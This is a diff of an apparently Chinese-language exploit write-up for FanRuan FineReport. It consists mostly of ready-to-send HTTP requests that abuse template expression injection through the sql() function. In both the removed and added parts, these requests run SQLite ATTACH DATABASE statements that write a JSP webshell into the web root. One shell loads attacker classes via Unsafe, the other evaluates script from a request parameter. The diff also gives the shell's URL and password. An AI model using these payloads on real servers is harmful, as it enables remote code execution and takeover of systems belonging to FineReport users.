@@ -7,12 +7,13 @@
 
 ```yaml
 body="isSupportForgetPwd"
+app="帆软-FineReport"
 ```
 
 ## poc
 
 ```java
-GET /webroot/decision/view/ReportServer?test=&n=${sum(1024,1)}
+GET /webroot/decision/view/ReportServer?test=&n=${9*9}
 HTTP/1.1
 Host: 192.168.174.152:8075
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0)Gecko/20100101 Firefox/128.0
@@ -25,16 +26,31 @@ Referer:http://192.168.174.152:8075/webroot/decision/login?origin=1dc5fbd4-27eb-
 Cookie: tenantId=default
 ```
 
-```yaml
-GET /webroot/decision/view/ReportServer?test=ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss&n=${__fr_locale__=sql('FRDemo',DECODE('%ef%bb%bf%61%74%74%61%63%68%0C%64%61%74%61%62%61%73%65%20%27%2F%68%6F%6D%65%2F%46%44%4C%2F%74%6F%6D%63%61%74%2D%6C%69%6E%75%78%2F%77%65%62%61%70%70%73%2F%77%65%62%72%6F%6F%74%2F%68%65%6C%70%2F%74%31%36%32%36%35%39%34%2E%6A%73%70%27%20%61%73%20%27%74%31%36%32%36%35%39%34%27%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%ef%bb%bf%63%72%65%61%74%65%0C%74%61%62%6C%65%20%74%31%36%32%36%35%39%34%2E%74%74%28%64%61%74%61%7A%20%74%65%78%74%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%ef%bb%bf%49%4E%53%45%52%54%0C%69%6E%74%6F%20%74%31%36%32%36%35%39%34%2E%74%74%28%64%61%74%61%7A%29%20%56%41%4C%55%45%53%20%28%27%3C%25%43%6C%61%73%73%20%73%61%66%65%20%3D%20%43%6C%61%73%73%2E%66%6F%72%4E%61%6D%65%28%22%73%75%6E%2E%6D%69%73%63%2E%55%6E%73%61%66%65%22%29%3B%6A%61%76%61%2E%6C%61%6E%67%2E%72%65%66%6C%65%63%74%2E%46%69%65%6C%64%20%73%61%66%65%43%6F%6E%20%3D%20%73%61%66%65%2E%67%65%74%44%65%63%6C%61%72%65%64%46%69%65%6C%64%28%22%74%68%65%55%6E%22%20%2B%20%22%73%61%66%65%22%29%3B%73%61%66%65%43%6F%6E%2E%73%65%74%41%63%63%65%73%73%69%62%6C%65%28%74%72%75%65%29%3B%73%75%6E%2E%6D%69%73%63%2E%55%6E%73%61%66%65%20%75%6E%53%61%66%65%20%3D%20%28%73%75%6E%2E%6D%69%73%63%2E%55%6E%73%61%66%65%29%20%73%61%66%65%43%6F%6E%2E%67%65%74%28%6E%75%6C%6C%29%3B%62%79%74%65%5B%5D%20%64%61%74%61%42%79%74%65%73%20%3D%20%6A%61%76%61%78%2E%78%6D%6C%2E%62%69%6E%64%2E%44%61%74%61%74%79%70%65%43%6F%6E%76%65%72%74%65%72%2E%70%61%72%73%65%42%61%73%65%36%34%42%69%6E%61%72%79%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%64%61%74%61%22%29%29%3B%75%6E%53%61%66%65%2E%64%65%66%69%6E%65%41%6E%6F%6E%79%6D%6F%75%73%43%6C%61%73%73%28%6A%61%76%61%2E%69%6F%2E%46%69%6C%65%2E%63%6C%61%73%73%2C%20%64%61%74%61%42%79%74%65%73%2C%20%6E%75%6C%6C%29%2E%6E%65%77%49%6E%73%74%61%6E%63%65%28%29%3B%25%3E%27%29%3B'),1,1)} HTTP/1.1
-host: xxxx
-connection: close
-content-type: application/x-www-form-urlencoded
-x-forwarded-for: xxxx
-accept-encoding: gzip, deflate
-user-agent: python-requests/2.31.0
-accept: */*
+![image-20240725213005972](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252130095.png)
+
+## 写文件
+
+注：打过一次之后还要再打的话要改下数据库名称
+
+```java
+GET /webroot/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Faaa.jsp%27%20as%20gggggg%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20gggggg.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20gggggg.exp2%28data%29%20VALUES%20%28x%27247b27272e676574436c61737328292e666f724e616d6528706172616d2e61292e6e6577496e7374616e636528292e676574456e67696e6542794e616d6528276a7327292e6576616c28706172616d2e62297d%27%29%3B'),1,1)} HTTP/1.1
+Host: 
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
 ```
 
-![image-20240724214141086](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407242141177.png)
+`http://127.0.0.1:8080/webroot/aaa.jsp?a=javax.script.ScriptEngineManager` 密码 b 
 
+![image-20240725213111459](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252131536.png)
+
+
+
+## 参考文章
+
+- https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/
+- https://mp.weixin.qq.com/s/AliftiLevjz5HB9uL0DOqQ
